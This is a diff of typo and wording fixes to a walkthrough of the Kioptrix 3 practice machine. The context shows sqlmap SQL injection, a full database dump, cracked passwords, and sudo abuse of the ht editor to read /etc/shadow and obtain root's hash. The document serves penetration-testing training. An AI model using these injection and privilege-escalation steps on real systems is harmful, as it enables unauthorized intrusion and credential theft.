@@ -28,7 +28,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
 The machine is running SSH and Apache.
 
 ### 2. Check out the web server
-The website is fairly simple with a few pages - a blog, photo gallery and a login form. The gallery CMS is apparently custom. Starting out there, it soon becomes pretty clear the gallery is based on a database backend, and images can be sorted by various columns in those tables. Firstly identify an injectable parameter:
+The website is fairly simple with a few pages - a blog, photo gallery and a login form. The gallery CMS is apparently custom. Starting out there, it is clear the gallery is based on a database backend, and images can be sorted by various columns in those tables. Firstly identify an injectable parameter:
 ```bash
 kali@kali:~/Desktop$ sqlmap -r gallery.request 
         ___
@@ -120,7 +120,7 @@ back-end DBMS: MySQL >= 4.1
 [*] ending @ 02:59:57 /2020-10-28/
 
 ```
-With an injectable parameter, I can then dump out all database information with `--dump-all`. This inccludes the gallery database.
+With an injectable parameter, I can then dump out all database information with `--dump-all`. This includes the gallery database.
 Among the dumped database tables is a dev_accounts table with two users and hashed passwords.
 ```bash
 kali@kali:~/Desktop/osc/kiol3/gallery$ cat dev_accounts.csv 
@@ -128,14 +128,14 @@ id,password,username
 1,0d3cfbec887aabd50f243b3f155c0f85,dreg
 2,5badcaf789d3d1d09794d8f021f40f0e,loneferret
 ```
-The first user's hash doesn't crack, however the second hash cracks to a plaintext password of `starwars`.
-Also there is another tables called gallarific_users with a single row.
+The first user hash doesn't crack, however the second hash cracks to a plaintext password of `starwars`.
+Also there is another table called gallarific_users with a single row.
 ```bash
 kali@kali:~/Desktop/osc/kiol3/gallery$ cat gallarific_users.csv 
 userid,email,photo,website,joincode,lastname,password,username,usertype,firstname,datejoined,issuperuser
 1,<blank>,<blank>,<blank>,<blank>,User,n0t7t1k4,admin,superuser,Super,1302628616,1
 ```
-These tables provide two sets of complete credentials:
+Together, these tables provide two sets of complete credentials:
 - `loneferret:starwars`
 - `admin:n0t7t1k4`
   
@@ -256,7 +256,7 @@ loneferret@Kioptrix3:~$ cat checksec.sh
 have_readelf=1
 verbose=false
 ```
-Checking sudo permissions, the user does indeed have sudo access to Ht. Ht is a file/hex editor, and since we have root access to it with no password I can use it to modify file on the system.
+Checking sudo permissions, the user does indeed have sudo access to Ht. Ht is a file/hex editor, and since we have root access to it with no password I can use it to modify files on the system as root.
 ```bash
 loneferret@Kioptrix3:~$ sudo -l         
 User loneferret may run the following commands on this host:
@@ -270,7 +270,7 @@ Error opening terminal: xterm-256color.
 loneferret@Kioptrix3:~$ export TERM=xterm  
 loneferret@Kioptrix3:~$ sudo ht /etc/shadow
 ```
-This opens the file and I can get the root hash of:
+This opens the file, and I can get root's hash/salt:
 ```
 root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::
 ```
